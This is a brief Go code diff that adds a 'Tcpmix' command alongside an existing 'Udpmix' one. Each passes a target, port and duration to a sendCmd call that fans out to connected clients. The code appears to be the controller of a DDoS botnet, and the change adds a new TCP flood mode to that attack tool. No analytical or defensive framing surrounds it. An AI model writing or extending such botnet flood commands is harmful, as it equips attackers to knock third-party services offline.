@@ -56,6 +56,10 @@ func Udpmix(target string, duration string, port string) {
 	sendCmd("udpmix", target, port, duration)
 }
 
+func Tcpmix(target string, duration string, port string) {
+	sendCmd("tcpmix", target, port, duration)
+}
+
 func Ping() {
 	for {
 		for _, conn := range Conns {
